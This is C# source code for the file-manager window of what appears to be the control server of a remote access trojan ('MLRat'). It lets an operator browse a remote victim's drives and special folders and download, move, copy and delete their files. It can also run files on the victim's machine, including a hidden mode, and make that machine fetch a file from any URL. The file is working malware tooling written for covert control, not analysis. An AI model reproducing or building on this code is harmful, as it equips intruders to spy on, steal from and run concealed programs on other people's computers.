using MLManagementServer.CustomObjects;
using MLManagementServer.Handlers;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class FileExplorerForm : Form
    {
        public IClient Client { get; set; }
        string CurrentDirectory = string.Empty;
        Dictionary<Guid, FileBucketInfo> BucketHandler = new Dictionary<Guid, FileBucketInfo>();
        formFileProperties FilePropertyForm = null;
        ImageList images = new ImageList();
        IServerUIHandler UIHost;
        bool customIcons = false;
        public FileExplorerForm(IServerUIHandler UIHandler, IClient c)
        {
            Client = c;
            UIHost = UIHandler;
            InitializeComponent();
            
            Image uiFolder = UIHandler.GetImage("folder.png");
            Image uiFolder2 = UIHandler.GetImage("folder2.png");
            Image uiFile = UIHandler.GetImage("file.png");
            Image uiDrive = UIHandler.GetImage("drive.png");
            Image uiError = UIHandler.GetImage("error.png");

            if(uiFolder != null)
                images.Images.Add("Folder", uiFolder);
            if (uiFolder2 != null)
                images.Images.Add("Folder2", uiFolder2);
            if (uiFile!=null)
                images.Images.Add("File", uiFile);
            if(uiDrive!=null)
                images.Images.Add("Drive", uiDrive);
            if(uiError != null)
                images.Images.Add("Error", uiError);

            lvFileView.SmallImageList = images;
            lvFileBucket.SmallImageList = images;
            c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
        }


        public void BeginUpdate(bool addUpDir, string currentdir)
        {
            CurrentDirectory = currentdir;
            Invoke((MethodInvoker)delegate ()
            {
                lvFileView.View = View.Details;
                lvFileView.Items.Clear();
                if (addUpDir)
                {
                    ListViewItem i = new ListViewItem("...");
                    i.Tag = true;
                    i.ImageKey = "Folder";
                    AddItem(i);
                    SetDir(currentdir);
                }
            });
        }

        void SetDir(string dir)
        {
            Invoke((MethodInvoker)delegate ()
            {
                tbPath.Text = dir;
            });
        }

        public void InvalidDirectory(string message)
        {
            ListViewItem i = new ListViewItem("Invalid Directory");
            i.Tag = true;
            i.ImageKey = "Error";
            i.SubItems.Add(message);
            AddItem(i);
        }

        void AddItem(ListViewItem i)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvFileView.Items.Add(i);
            });
        }

        public void AddDrive(string name, string size, string label)
        {
            string dLabel = label;
            if (string.IsNullOrWhiteSpace(dLabel))
                dLabel = "Local Disk";
            ListViewItem i = new ListViewItem(string.Format("{0} ({1})", dLabel, name.Substring(0, name.Length -1)));
            i.Tag = name;
            i.ImageKey = "Drive";
            i.SubItems.Add(size);
            AddItem(i);
        }

        public void AddDirectory(string name, bool empty)
        {
            ListViewItem i = new ListViewItem(name);
            i.Tag = false;
            i.ImageKey = "Folder";
            if(!empty)
            {
                if (images.Images.ContainsKey("Folder2"))
                {
                    i.ImageKey = "Folder2";
                }
            }
            AddItem(i);
        }
        public void AddFile(string name, string size)
        {
            ListViewItem i = new ListViewItem(name);
            i.Tag = false;
            i.ImageKey = "File";
            if (customIcons)
            {
                string fullExt = Path.GetExtension(name).ToLower();
                string extention = fullExt.Substring(1, fullExt.Length - 1);
                if (!images.Images.ContainsKey(extention))
                {
                    Image extImage = UIHost.GetImage(string.Format("FileExtention/file_extension_{0}.png", extention));
                    if (extImage != null)
                    {
                        images.Images.Add(extention, extImage);
                        i.ImageKey = extention;
                    }
                }
                else
                {
                    i.ImageKey = extention;
                }
            }
            i.SubItems.Add(size);
            AddItem(i);
        }

        private void FileExplorerForm_Load(object sender, EventArgs e)
        {

        }

        private void lvFileView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
           if (lvFileView.View == View.List)
                return;
            if (lvFileView.SelectedItems.Count > 0)
            {
                lvFileView.View = View.List;
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey == "File")
                    return;
                string path = i.Text;
                if (i.ImageKey == "Drive")
                {
                    CurrentDirectory = (string)i.Tag;
                    if (string.IsNullOrWhiteSpace(CurrentDirectory))
                        CurrentDirectory = string.Empty;
                }
                else
                {
                    if ((bool)i.Tag == true)
                    {
                        if (CurrentDirectory.EndsWith(":\\"))
                        {
                            CurrentDirectory = string.Empty;
                        }
                        else
                        {
                            string[] disect = CurrentDirectory.Split('\\');
                            int offset = (disect.Length == 2) ? 0 : 1;
                            CurrentDirectory = CurrentDirectory.Substring(0, (CurrentDirectory.Length - disect[disect.Length - 1].Length) - offset);
                        }
                    }
                    else
                    {

                       // if (!CurrentDirectory.EndsWith("\\") && CurrentDirectory != string.Empty)
                       //     CurrentDirectory += "\\";
                        CurrentDirectory = Path.Combine(CurrentDirectory, path);
                        if (string.IsNullOrWhiteSpace(CurrentDirectory))
                            CurrentDirectory = string.Empty;
                    }
                }
                lvFileView.Items.Clear();
                lvFileView.Items.Add("Loading...");
                Console.WriteLine("Current directory: {0}", CurrentDirectory);
                Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.View == View.List)
                return;
            lvFileView.View = View.List;
            lvFileView.Items.Clear();
            lvFileView.Items.Add("Loading...");
            Console.WriteLine("Current directory: {0}", CurrentDirectory);
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
        }

        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.SelectedItems.Count > 0)
            {
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey != "File")
                    return;
                string rPath = Path.Combine(CurrentDirectory, i.Text);
                FileExplorerHandler.StartDownload(Client, rPath);
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem i in lvFileView.SelectedItems)
            {
                if(i.ImageKey == "File")
                {
                    ListViewItem bi = new ListViewItem(i.Text);
                    FileBucketInfo bucketInfo = new FileBucketInfo();
                    bucketInfo.RemotePath = Path.Combine(CurrentDirectory, i.Text);
                    bucketInfo.RenameTo = i.Text;
                    bucketInfo.DisplayInfo = bi;
                    bucketInfo.RemoteDirectory = CurrentDirectory;

                    bi.SubItems.Add(bucketInfo.RenameTo);
                    bi.SubItems.Add(bucketInfo.RemotePath);
                    bi.SubItems.Add("...");
                    bi.Tag = bucketInfo;
                    bi.ImageKey = "File";
                    lvFileBucket.Items.Add(bi);
                    Guid id = Guid.NewGuid();
                    while(BucketHandler.ContainsKey(id))
                        id = Guid.NewGuid();
                    bucketInfo.ID = id;
                    BucketHandler.Add(id, bucketInfo);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileBucket.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvFileBucket.SelectedItems[0];
            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
            if (bucketInfo.DoingOperation)
                return;
            using (formInput rename = new formInput("Rename", i.Text))
            {
                if (rename.ShowDialog() != DialogResult.OK)
                    return;
                bucketInfo.RenameTo = rename.InputText;
            }
            i.SubItems[1].Text = bucketInfo.RenameTo;
        }

        private void moveHereToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileBucket.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvFileBucket.SelectedItems[0];
            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
            if (bucketInfo.DoingOperation)
                return;
            if (bucketInfo.RemoteDirectory == CurrentDirectory)
            {
                MessageBox.Show("You are in the same directory.");
                return;
            }
            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
            bucketInfo.DoingOperation = true;
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.ForceMoveFile, bucketInfo.ID, bucketInfo.RemotePath, Path.Combine(CurrentDirectory, bucketInfo.RenameTo));
            i.SubItems[3].Text = "Moving (Force)...";
        }

        private void removeFromBucketToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileBucket.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvFileBucket.SelectedItems[0];
            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
            if (bucketInfo.DoingOperation)
                return;
            if(MessageBox.Show(string.Format("Remove {0} from bucket?", i.Text), "Remove from bucket", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                if(BucketHandler.ContainsKey(bucketInfo.ID))
                    BucketHandler.Remove(bucketInfo.ID);
                lvFileBucket.Items.Remove(i);
            }
        }

        public void HandleMoveResponce(Guid id, bool success)
        {
            if(BucketHandler.ContainsKey(id))
            {
                Invoke((MethodInvoker)delegate ()
                {
                    FileBucketInfo info = BucketHandler[id];
                    ListViewItem i = (ListViewItem)info.DisplayInfo;
                    i.SubItems[3].Text = success ? "Moved Successfully." : "Failed to move.";
                    info.DoingOperation = false;
                    if (success)
                    {
                        info.RemotePath = info.RemoteDestination;
                        info.RemoteDirectory = info.RemoteDestinationDirectory;
                        i.SubItems[0].Text = info.RenameTo;
                        i.SubItems[1].Text = info.RenameTo;
                        i.SubItems[2].Text = info.RemotePath;

                        if (info.RemoteDestinationDirectory == CurrentDirectory)
                        {
                            if (lvFileView.View == View.List)
                                return;
                            lvFileView.View = View.List;
                            lvFileView.Items.Clear();
                            lvFileView.Items.Add("Loading...");
                            Console.WriteLine("Current directory: {0}", CurrentDirectory);
                            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
                        }
                    }
                });

            }
        }

        public void HandleCopyResponce(Guid id, bool success)
        {
            if (BucketHandler.ContainsKey(id))
            {
                Invoke((MethodInvoker)delegate ()
                {
                    FileBucketInfo info = BucketHandler[id];
                    ListViewItem i = (ListViewItem)info.DisplayInfo;
                    i.SubItems[3].Text = success ? "Copied Successfully." : "Failed to copy.";
                    info.DoingOperation = false;
                    if (success && info.RemoteDestinationDirectory == CurrentDirectory)
                    {
                        if (lvFileView.View == View.List)
                            return;
                        lvFileView.View = View.List;
                        lvFileView.Items.Clear();
                        lvFileView.Items.Add("Loading...");
                        Console.WriteLine("Current directory: {0}", CurrentDirectory);
                        Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
                    }
                });
            }
        }

        private void copyHereToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileBucket.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvFileBucket.SelectedItems[0];
            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
            if (bucketInfo.DoingOperation)
                return;
            if (bucketInfo.RemoteDirectory == CurrentDirectory)
            {
                MessageBox.Show("You are in the same directory.");
                return;
            }
            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
            bucketInfo.DoingOperation = true;
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.CopyFile, bucketInfo.ID, bucketInfo.RemotePath, bucketInfo.RemoteDestination);
            i.SubItems[3].Text = "Copying...";
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

            if (lvFileBucket.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvFileBucket.SelectedItems[0];
            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
            if (bucketInfo.DoingOperation)
                return;
            if (bucketInfo.RemoteDirectory == CurrentDirectory)
            {
                MessageBox.Show("You are in the same directory.");
                return;
            }
            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
            bucketInfo.DoingOperation = true;
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.MoveFile, bucketInfo.ID, bucketInfo.RemotePath, bucketInfo.RemoteDestination);
            i.SubItems[3].Text = "Moving...";
        }

        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.SelectedItems.Count > 0)
            {
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey != "File")
                    return;
                string rPath = Path.Combine(CurrentDirectory, i.Text);
                if(MessageBox.Show(string.Format("Delete the file \"{0}\"? \nLocation: {1}", i.Text, rPath), "Delete File", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    Client.Send((byte)NetworkCommand.DeleteFile, rPath);
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void normalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.SelectedItems.Count > 0)
            {
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey != "File")
                    return;
                string rPath = Path.Combine(CurrentDirectory, i.Text);
                Client.Send((byte)NetworkCommand.Execute, rPath);
            }
        }

        private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.SelectedItems.Count > 0)
            {
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey != "File")
                    return;
                string rPath = Path.Combine(CurrentDirectory, i.Text);
                Client.Send((byte)NetworkCommand.ExecuteHidden, rPath);
            }
        }

        private void downloadFileToLocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void downloadFileHereToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (formDownloadFile dl = new formDownloadFile())
            {
                if (dl.ShowDialog() != DialogResult.OK)
                    return;
                Client.Send((byte)NetworkCommand.DownloadFile, dl.URL, Path.Combine(CurrentDirectory, dl.FileName));
            }
        }

        public void HandleProperties(object[] data)
        {
            if (FilePropertyForm == null)
                return;
            FilePropertyForm.HandleData(data);
        }

        private void propertiesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.SelectedItems.Count > 0)
            {
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey != "File")
                    return;
                string rPath = Path.Combine(CurrentDirectory, i.Text);
                Guid id = Guid.NewGuid();
                while (BucketHandler.ContainsKey(id))
                    id = Guid.NewGuid();
                BucketHandler.Add(id, null);
                FilePropertyForm = new formFileProperties(id);
                FilePropertyForm.FormClosed += FilePropertyForm_FormClosed;
                Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.GetFileProperties, id, rPath);
                FilePropertyForm.ShowDialog();
            }
            
        }

        private void FilePropertyForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            formFileProperties f = (formFileProperties)sender;
            f.Dispose();
        }

        private void apptadaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.View == View.List)
                return;
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.UpdateToSpecialFolder, (int)(Environment.SpecialFolder.ApplicationData));
        }

        private void rootdriveListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.UpdateToSpecialFolder, (int)(Environment.SpecialFolder.Desktop));
        }

        private void showCustomIconsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            customIcons = showCustomIconsToolStripMenuItem.Checked;
        }

        private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
    
}
